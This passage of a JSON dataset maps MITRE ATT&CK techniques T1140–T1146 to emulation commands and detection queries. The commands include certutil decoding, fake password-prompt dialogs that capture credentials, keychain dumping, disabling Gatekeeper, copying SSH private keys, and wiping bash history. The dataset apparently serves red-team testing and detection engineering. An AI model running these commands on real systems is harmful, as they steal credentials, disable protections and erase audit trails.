folder\n", "supported_platforms": ["windows"], "input_arguments": {"executable": {"description": "name of executable", "type": "path", "default": "C:\\Windows\\System32\\calc.exe"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "certutil -encode #{executable} %temp%\\T1140_calc.txt\ncertutil -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe\n", "cleanup_command": "del %temp%\\T1140_calc.txt >nul 2>&1\ndel %temp%T1140_calc_decoded.exe >nul 2>&1\n"}}, {"name": "Certutil Rename and Decode", "description": "Rename certutil and decode a file. This is in reference to latest research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)\n", "supported_platforms": ["windows"], "input_arguments": {"executable": {"description": "name of executable/file to decode", "type": "path", "default": "C:\\Windows\\System32\\calc.exe"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -encode #{executable} %temp%\\T1140_calc.txt\n%temp%\\tcm.tmp -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe\n", "cleanup_command": "del %temp%\\tcm.tmp >nul 2>&1\ndel %temp%\\T1140_calc.txt >nul 2>&1\ndel %temp%T1140_calc_decoded.exe >nul 2>&1\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100014", "os": "windows", "parent_process": "certutil.exe", "commandline_string": "-decode", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "deobfuscation", "mitre_attack": "T1140", "itw_sample": "c0d67fa9ef4292d1e6f18005163f1d86fbe18f68a6ef70e0744f12b12f44cf7c"}}, {"SysmonHunter - T1140": {"name": "Deobfuscate/Decode Files or Information", "description": null, "level": "high", "phase": "Defense Evasion, Execution", "query": [{"type": "process", "process": {"image": {"pattern": "certutil.exe"}, "cmdline": {"pattern": "-decode|-urlcache"}}}, {"type": "process", "process": {"cmdline": {"pattern": "certutil.exe|-decode|-urlcache"}}}]}}], "command_list": ["certutil -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc.txt\ncertutil -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe\n", "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc.txt\n%temp%\\tcm.tmp -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe\n", "certutil.exe -decode", "certutil.exe-decode|-urlcache", "certutil.exe|-decode|-urlcache"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_path contains \"certutil.exe\"and process_command_line contains \"decode\")", "name": "Deobfuscate Decode Files Or Information"}], "possible_detections": [{"data_source": {"title": "Encoded FromBase64String", "id": "fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c", "status": "experimental", "description": "Detects a base64 encoded FromBase64String keyword in a process command line", "author": "Florian Roth", "date": "2019/08/24", "tags": ["attack.t1086", "attack.t1140", "attack.execution", "attack.defense_evasion"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine|base64offset|contains": "::FromBase64String"}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["unknown"], "level": "critical"}}, {"data_source": {"title": "Encoded IEX", "id": "88f680b8-070e-402c-ae11-d2914f2257f1", "status": "experimental", "description": "Detects a base64 encoded IEX command string in a process command line", "author": "Florian Roth", "date": "2019/08/23", "tags": ["attack.t1086", "attack.t1140", "attack.execution"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine|base64offset|contains": ["IEX ([", "iex ([", "iex (New", "IEX (New"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["unknown"], "level": "critical"}}, {"data_source": {"title": "Suspicious Commandline Escape", "id": "f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd", "description": "Detects suspicious process that use escape characters", "status": "experimental", "references": ["https://twitter.com/vysecurity/status/885545634958385153", "https://twitter.com/Hexacorn/status/885553465417756673", "https://twitter.com/Hexacorn/status/885570278637678592", "https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html", "http://www.windowsinspired.com/understanding-the-command-line-string-and-arguments-received-by-a-windows-program/"], "author": "juju4", "modified": "2018/12/11", "tags": ["attack.defense_evasion", "attack.t1140"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["^h^t^t^p", "h\"t\"t\"p"]}, "condition": "selection"}, "falsepositives": ["False positives depend on scripts and administrative tools used in the monitored environment"], "level": "low"}}, {"data_source": {"title": "MSHTA Suspicious Execution 01", "id": "cc7abbd0-762b-41e3-8a26-57ad50d2eea3", "status": "experimental", "description": "Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism", "date": "22/02/2019", "modified": "22/02/2019", "author": "Diego Perez (@darkquassar)", "references": ["http://blog.sevagas.com/?Hacking-around-HTA-files", "https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356", "https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script", "https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997"], "tags": ["attack.defense_evasion", "attack.t1140"], "logsource": {"category": "process_creation", "product": "windows"}, "falsepositives": ["False positives depend on scripts and administrative tools used in the monitored environment"], "level": "high", "detection": {"selection1": {"CommandLine": ["*mshta vbscript:CreateObject(\"Wscript.Shell\")*", "*mshta vbscript:Execute(\"Execute*", "*mshta vbscript:CreateObject(\"Wscript.Shell\").Run(\"mshta.exe*"]}, "selection2": {"Image": ["C:\\Windows\\system32\\mshta.exe"], "CommandLine": ["*.jpg*", "*.png*", "*.lnk*", "*.xls*", "*.doc*", "*.zip*"]}, "condition": "selection1 or selection2"}}}]}, {"technique_id": "T1141", "commands": [{"source": "atomics/T1141/T1141.yaml", "command": "osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'\n", "name": null}, {"source": "atomics/T1141/T1141.yaml", "command": "# Creates GUI to prompt for password. Expect long pause before prompt is available.    \n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/prompt", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/prompt", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/prompt", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/prompt", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/screensaver_alleyoop", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/screensaver_alleyoop", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Input Prompt": {"attack_technique": "T1141", "display_name": "Input Prompt", "atomic_tests": [{"name": "AppleScript - Prompt User for Password", "description": "Prompt User for Password (Local Phishing)\nReference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "command": "osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'\n"}}, {"name": "PowerShell - Prompt User for Password", "description": "Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.\n\nReference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "# Creates GUI to prompt for password. Expect long pause before prompt is available.    \n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/prompt", "ATT&CK Technique #1": "T1141", "ATT&CK Technique #2": "", "Technique": "Input Prompt", "Concatenate for Python Dictionary": "\"powershell/collection/prompt\":  [\"T1141\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/prompt", "ATT&CK Technique #1": "T1141", "ATT&CK Technique #2": "", "Technique": "Input Prompt", "Concatenate for Python Dictionary": "\"python/collection/osx/prompt\":  [\"T1141\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/screensaver_alleyoop", "ATT&CK Technique #1": "T1141", "ATT&CK Technique #2": "", "Technique": "Input Prompt", "Concatenate for Python Dictionary": "\"python/collection/osx/screensaver_alleyoop\":  [\"T1141\"],"}}], "command_list": ["osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'\n", "# Creates GUI to prompt for password. Expect long pause before prompt is available.    \n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password", "powershell/collection/prompt", "powershell/collection/prompt", "python/collection/osx/prompt", "python/collection/osx/prompt", "python/collection/osx/screensaver_alleyoop", "python/collection/osx/screensaver_alleyoop"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1142", "commands": [{"source": "atomics/T1142/T1142.yaml", "command": "security -h\nsecurity find-certificate -a -p > allcerts.pem\nsecurity import /tmp/certs.pem -k\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/keychaindump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/keychaindump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/keychaindump_chainbreaker", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/keychaindump_chainbreaker", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/keychaindump_decrypt", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/keychaindump_decrypt", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Keychain": {"attack_technique": "T1142", "display_name": "Keychain", "atomic_tests": [{"name": "Keychain", "description": "### Keychain Files\n\n  ~/Library/Keychains/\n\n  /Library/Keychains/\n\n  /Network/Library/Keychains/\n\n  [Security Reference](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/security.1.html)\n\n  [Keychain dumper](https://github.com/juuso/keychaindump)\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "command": "security -h\nsecurity find-certificate -a -p > allcerts.pem\nsecurity import /tmp/certs.pem -k\n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/keychaindump", "ATT&CK Technique #1": "T1142", "ATT&CK Technique #2": "", "Technique": "Keychain", "Concatenate for Python Dictionary": "\"python/collection/osx/keychaindump\":  [\"T1142\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/keychaindump_chainbreaker", "ATT&CK Technique #1": "T1142", "ATT&CK Technique #2": "", "Technique": "Keychain", "Concatenate for Python Dictionary": "\"python/collection/osx/keychaindump_chainbreaker\":  [\"T1142\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/keychaindump_decrypt", "ATT&CK Technique #1": "T1142", "ATT&CK Technique #2": "", "Technique": "Keychain", "Concatenate for Python Dictionary": "\"python/collection/osx/keychaindump_decrypt\":  [\"T1142\"],"}}], "command_list": ["security -h\nsecurity find-certificate -a -p > allcerts.pem\nsecurity import /tmp/certs.pem -k\n", "python/collection/osx/keychaindump", "python/collection/osx/keychaindump", "python/collection/osx/keychaindump_chainbreaker", "python/collection/osx/keychaindump_chainbreaker", "python/collection/osx/keychaindump_decrypt", "python/collection/osx/keychaindump_decrypt"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1143", "commands": [{"source": "atomics/T1143/T1143.yaml", "command": "Start-Process powershell.exe -WindowStyle hidden calc.exe\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Hidden Window": {"attack_technique": "T1143", "display_name": "Hidden Window", "atomic_tests": [{"name": "Hidden Window", "description": "Launch PowerShell with the \"-WindowStyle Hidden\" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.\nUpon execution a hidden PowerShell window will launch calc.exe\n", "supported_platforms": ["windows"], "input_arguments": {"powershell_command": {"description": "Command to launch calc.exe from a hidden PowerShell Window", "type": "String", "default": "powershell.exe -WindowStyle hidden calc.exe"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "Start-Process #{powershell_command}\n"}}]}}], "command_list": ["Start-Process powershell.exe -WindowStyle hidden calc.exe\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1144", "commands": [{"source": "atomics/T1144/T1144.yaml", "command": "sudo xattr -r -d com.apple.quarantine myapp.app\nsudo spctl --master-disable\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Gatekeeper Bypass": {"attack_technique": "T1144", "display_name": "Gatekeeper Bypass", "atomic_tests": [{"name": "Gatekeeper Bypass", "description": "Gatekeeper Bypass via command line\n", "supported_platforms": ["macos"], "input_arguments": {"app_path": {"description": "Path to app to be used", "type": "Path", "default": "myapp.app"}}, "executor": {"name": "sh", "command": "sudo xattr -r -d com.apple.quarantine #{app_path}\nsudo spctl --master-disable\n"}}]}}], "command_list": ["sudo xattr -r -d com.apple.quarantine myapp.app\nsudo spctl --master-disable\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1145", "commands": [{"source": "atomics/T1145/T1145.yaml", "command": "dir c:\\ /b /s .key | findstr /e .key\n", "name": null}, {"source": "atomics/T1145/T1145.yaml", "command": "find / -name id_rsa >> /tmp/keyfile_locations.txt\nfind / -name id_dsa >> /tmp/keyfile_locations.txt\n", "name": null}, {"source": "atomics/T1145/T1145.yaml", "command": "mkdir /tmp/art-staging\nfind / -name id_rsa -exec cp --parents {} /tmp/art-staging \\;\nfind / -name id_dsa -exec cp --parents {} /tmp/art-staging \\;\n", "name": null}, {"source": "atomics/T1145/T1145.yaml", "command": "mkdir /tmp/art-staging\nfind / -name id_rsa -exec rsync -R {} /tmp/art-staging \\;\nfind / -name id_dsa -exec rsync -R {} /tmp/art-staging \\;\n", "name": null}, {"source": "data/abilities/credential-access/de632c2d-a729-4b77-b781-6a6b09c148ba.yml", "command": {"windows": {"psh": {"command": "foreach($i in @(\".key\",\".pgp\",\".gpg\",\".ppk\",\".p12\",\".pem\",\".pfx\",\".cer\",\".p7b\",\".asc\",\".crt\")){Get-ChildItem -Path c:\\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match \"$i$\"}}\n"}, "cmd": {"command": "for %i in (\\.key \\.pgp \\.gpg \\.ppk \\.p12 \\.pem \\.pfx \\.cer \\.p7b \\.asc) do (dir c:\\ /b /s .key | findstr /e \"%i\")\n"}}, "darwin": {"sh": {"command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /Users -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;\n"}}, "linux": {"sh": {"command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;"}}}, "name": "Find private keys on the file system"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/certs", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/certs", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/keys", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/keys", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "**Private Keys:**", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "find / -type f \\( -name \"*.pem\" -o -name \"*.pgp\" -o -name \"*.gpg\" -o -name \"*.ppk\" -o -name \"*.p12\" -o -name \"*.key\" -o -name \"*.pfx\" -o -name \"*.cer\" -o -name \"*.p7b\" -o -name \"*.asc\" -o -name \"authorized*\"  \\)", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "**look for Users' SSH Private Key:** find / -name id_rsa OR find / -name id_dsa", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "**Copy Private SSH Keys with CP:** find / -name id_rsa -exec cp --parents {} #{output_folder} \\;", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "find / -name id_dsa -exec cp --parents {} #{output_folder} \\;", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "**Copy Private SSH Keys with rsync:**", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "find / -name id_rsa -exec rsync -R {} #{output_folder} \\;", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "find / -name id_dsa -exec rsync -R {} #{output_folder} \\;", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Private Keys": {"attack_technique": "T1145", "display_name": "Private Keys", "atomic_tests": [{"name": "Private Keys", "description": "Find private keys on the Windows file system.\nFile extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "dir c:\\ /b /s .key | findstr /e .key\n"}}, {"name": "Discover Private SSH Keys", "description": "Discover private SSH keys on a macOS or Linux system.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"output_file": {"description": "Output file containing locations of SSH key files", "type": "path", "default": "/tmp/keyfile_locations.txt"}}, "executor": {"name": "sh", "command": "find / -name id_rsa >> #{output_file}\nfind / -name id_dsa >> #{output_file}\n"}}, {"name": "Copy Private SSH Keys with CP", "description": "Copy private SSH keys on a Linux system to a staging folder using the `cp` command.\n", "supported_platforms": ["linux"], "input_arguments": {"output_folder": {"description": "Output folder containing copies of SSH private key files", "type": "path", "default": "/tmp/art-staging"}}, "executor": {"name": "sh", "command": "mkdir #{output_folder}\nfind / -name id_rsa -exec cp --parents {} #{output_folder} \\;\nfind / -name id_dsa -exec cp --parents {} #{output_folder} \\;\n"}}, {"name": "Copy Private SSH Keys with rsync", "description": "Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"output_folder": {"description": "Output folder containing copies of SSH private key files", "type": "path", "default": "/tmp/art-staging"}}, "executor": {"name": "sh", "command": "mkdir #{output_folder}\nfind / -name id_rsa -exec rsync -R {} #{output_folder} \\;\nfind / -name id_dsa -exec rsync -R {} #{output_folder} \\;\n"}}]}}, {"Mitre Stockpile - Find private keys on the file system": {"id": "de632c2d-a729-4b77-b781-6a6b09c148ba", "name": "Find private keys", "description": "Find private keys on the file system", "tactic": "credential-access", "technique": {"attack_id": "T1145", "name": "Private Keys"}, "platforms": {"windows": {"psh": {"command": "foreach($i in @(\".key\",\".pgp\",\".gpg\",\".ppk\",\".p12\",\".pem\",\".pfx\",\".cer\",\".p7b\",\".asc\",\".crt\")){Get-ChildItem -Path c:\\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match \"$i$\"}}\n"}, "cmd": {"command": "for %i in (\\.key \\.pgp \\.gpg \\.ppk \\.p12 \\.pem \\.pfx \\.cer \\.p7b \\.asc) do (dir c:\\ /b /s .key | findstr /e \"%i\")\n"}}, "darwin": {"sh": {"command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /Users -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;\n"}}, "linux": {"sh": {"command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;"}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/certs", "ATT&CK Technique #1": "T1145", "ATT&CK Technique #2": "", "Technique": "Private Keys", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/certs\":  [\"T1145\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/keys", "ATT&CK Technique #1": "T1145", "ATT&CK Technique #2": "", "Technique": "Private Keys", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/keys\":  [\"T1145\"],"}}], "command_list": ["dir c:\\ /b /s .key | findstr /e .key\n", "find / -name id_rsa >> /tmp/keyfile_locations.txt\nfind / -name id_dsa >> /tmp/keyfile_locations.txt\n", "mkdir /tmp/art-staging\nfind / -name id_rsa -exec cp --parents {} /tmp/art-staging \\;\nfind / -name id_dsa -exec cp --parents {} /tmp/art-staging \\;\n", "mkdir /tmp/art-staging\nfind / -name id_rsa -exec rsync -R {} /tmp/art-staging \\;\nfind / -name id_dsa -exec rsync -R {} /tmp/art-staging \\;\n", {"windows": {"psh": {"command": "foreach($i in @(\".key\",\".pgp\",\".gpg\",\".ppk\",\".p12\",\".pem\",\".pfx\",\".cer\",\".p7b\",\".asc\",\".crt\")){Get-ChildItem -Path c:\\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match \"$i$\"}}\n"}, "cmd": {"command": "for %i in (\\.key \\.pgp \\.gpg \\.ppk \\.p12 \\.pem \\.pfx \\.cer \\.p7b \\.asc) do (dir c:\\ /b /s .key | findstr /e \"%i\")\n"}}, "darwin": {"sh": {"command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /Users -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;\n"}}, "linux": {"sh": {"command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;"}}}, "powershell/credentials/mimikatz/certs", "powershell/credentials/mimikatz/certs", "powershell/credentials/mimikatz/keys", "powershell/credentials/mimikatz/keys", "**Private Keys:**", "find / -type f \\( -name \"*.pem\" -o -name \"*.pgp\" -o -name \"*.gpg\" -o -name \"*.ppk\" -o -name \"*.p12\" -o -name \"*.key\" -o -name \"*.pfx\" -o -name \"*.cer\" -o -name \"*.p7b\" -o -name \"*.asc\" -o -name \"authorized*\"  \\)", "**look for Users' SSH Private Key:** find / -name id_rsa OR find / -name id_dsa", "**Copy Private SSH Keys with CP:** find / -name id_rsa -exec cp --parents {} #{output_folder} \\;", "find / -name id_dsa -exec cp --parents {} #{output_folder} \\;", "**Copy Private SSH Keys with rsync:**", "find / -name id_rsa -exec rsync -R {} #{output_folder} \\;", "find / -name id_dsa -exec rsync -R {} #{output_folder} \\;"], "attack_paths": [], "queries": [{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: the attacker to find the private key file under linux\ndescription: Ubuntu18.04\nreferences: https://github.com/12306Bro/Threathunting/blob/master/T1145-linux- private .md\ntags: T1145\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: linux\n\u00a0\u00a0\u00a0\u00a0service: history\ndetection:\n\u00a0\u00a0\u00a0\u00a0keywords:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- sudo find / -name * .pgp\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- sudo find / -name * .pem\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- sudo find / -name * .ppk\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- sudo find / -name * .p12\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- sudo find / -name * .key\n\u00a0\u00a0\u00a0\u00a0condition: keywords\nlevel: medium", "name": "Yml"}, {"product": "Splunk", "query": "index=* sourcetype=bash_history find AND (.pem OR authorized OR gpg OR pgp OR .ppk OR .cer OR .key OR .asc)", "name": null}, {"product": "Splunk", "query": "index=* sourcetype=bash_history find AND (id_rsa OR id_dsa)", "name": null}], "possible_detections": [{"data_source": "bash_history logs"}]}, {"technique_id": "T1146", "commands": [{"source": "atomics/T1146/T1146.yaml", "command": "rm ~/.bash_history\n", "name": null}, {"source": "atomics/T1146/T1146.yaml", "command": "echo \"\" > ~/.bash_history\n", "name": null}, {"source": "atomics/T1146/T1146.yaml", "command": "cat /dev/null > ~/.bash_history\n", "name": null}, {"source": "atomics/T1146/T1146.yaml", "command": "ln -sf /dev/null ~/.bash_history\n", "name": null}, {"source": "atomics/T1146/T1146.yaml", "command": "truncate -s0 ~/.bash_history\n", "name": null}, {"source": "atomics/T1146/T1146.yaml", "command": "unset HISTFILE\nexport HISTFILESIZE=0\nhistory -c\n", "name": null}, {"source": "Threat Hunting Tables", "command": "bash unset HISTFILE", "name": null}, {"source": "Threat Hunting Tables", "command": "bash export HISTFILESIZE=0", "name": null}, {"source": "Threat Hunting Tables", "command": "bash history -c", "name": null}, {"source": "Threat Hunting Tables", "command": "bash rm ~/.bash_history", "name": null}, {"source": "Threat Hunting Tables", "command": "bash cat /dev/null > ~/.bash_history", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "rm ~/.bash_history", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo \" \" > .bash_history", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "cat /dev/null > ~/.bash_history", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "ln -sf /dev/null ~/.bash_history", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "truncate -s0 ~/.bash_history", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "unset HISTFILE", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "export HISTFILESIZE=0", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "history -c", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Clear Command History": {"attack_technique": "T1146", "display_name": "Clear Command History", "atomic_tests": [{"name": "Clear Bash history (rm)", "description": "Clears bash history via rm\n", "supported_platforms": ["linux", "macos"], "executor": {"name": "sh", "command": "rm ~/.bash_history\n"}}, {"name": "Clear Bash history (echo)", "description": "Clears bash history via rm\n", "supported_platforms": ["linux", "macos"], "executor": {"name": "sh", "command": "echo \"\" > ~/.bash_history\n"}}, {"name": "Clear Bash history (cat dev/null)", "description": "Clears bash history via cat /dev/null\n", "supported_platforms": ["linux", "macos"], "executor": {"name": "sh", "command": "cat /dev/null > ~/.bash_history\n"}}, {"name": "Clear Bash history (ln dev/null)", "description": "Clears bash history via a symlink to /dev/null\n", "supported_platforms": ["linux", "macos"], "executor": {"name": "sh", "command": "ln -sf /dev/null ~/.bash_history\n"}}, {"name": "Clear Bash history (truncate)", "description": "Clears bash history via truncate\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "command": "truncate -s0 ~/.bash_history\n"}}, {"name": "Clear history of a bunch of shells", "description": "Clears the history of a bunch of different shell types by setting the history size to zero\n", "supported_platforms": ["linux", 